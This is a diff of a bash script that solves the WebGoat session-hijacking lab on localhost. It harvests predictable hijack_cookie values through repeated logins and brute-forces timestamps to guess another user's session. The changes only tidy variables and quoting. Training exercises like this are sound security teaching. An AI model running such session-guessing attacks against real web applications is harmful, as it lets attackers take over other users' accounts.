@@ -5,14 +5,14 @@
 # shellcheck disable=SC2034
 #
 ########################################################################################
-####[ Variables ]#######################################################################
+####[ Global Variables ]################################################################
 
 
 # Change this value with your current JSESSIONID.
-JSESSIONID="iVXrFopjS83FiTWQU3mptseIkneFOBqxNrr49oSm"
+readonly JSESSIONID="iVXrFopjS83FiTWQU3mptseIkneFOBqxNrr49oSm"
 
-username="admin"
-password="password123"
+readonly C_USERNAME="admin"
+readonly C_PASSWORD="password123"
 
 session_id=0
 session_start_time=0
@@ -23,7 +23,7 @@ current_session_timestamp=0
 previous_session_timestamp=0
 
 
-#### [ Main ]###########################################################################
+####[ Main ]############################################################################
 
 
 echo "=========== Searching for session ==========="
@@ -31,7 +31,7 @@ echo ""
 
 for request in {1..1000}; do
     current_session="$(curl -i -s -X POST \
-        "http://localhost:8080/WebGoat/HijackSession/login/?username=$username&password=$password" \
+        "http://localhost:8080/WebGoat/HijackSession/login/?username=$C_USERNAME&password=$C_PASSWORD" \
         -H "Cookie: JSESSIONID=$JSESSIONID;" \
         | grep -Eo 'hijack_cookie=[0-9]*-[0-9]*' \
         | cut -d '=' -f 2)"
@@ -53,8 +53,8 @@ for request in {1..1000}; do
         fi
     fi
 
-    previous_session_id=$current_session_id
-    previous_session_timestamp=$current_session_timestamp
+    previous_session_id="$current_session_id"
+    previous_session_timestamp="$current_session_timestamp"
 done
 
 echo ""
@@ -68,12 +68,10 @@ echo ""
 
 for (( timestamp=session_start_time; timestamp<=session_end_time; timestamp++ )); do
     response=$(curl -i -s -X POST \
-        "http://localhost:8080/WebGoat/HijackSession/login/?username=$username&password=$password" \
+        "http://localhost:8080/WebGoat/HijackSession/login/?username=$C_USERNAME&password=$C_PASSWORD" \
         -H "Cookie: JSESSIONID=$JSESSIONID; hijack_cookie=$session_id-$timestamp; secure;" \
         | grep 'feedback' | cut -d ":" -f 2)
 
     echo "$session_id-$timestamp: $response"
 done
-
-########################################################################################
 
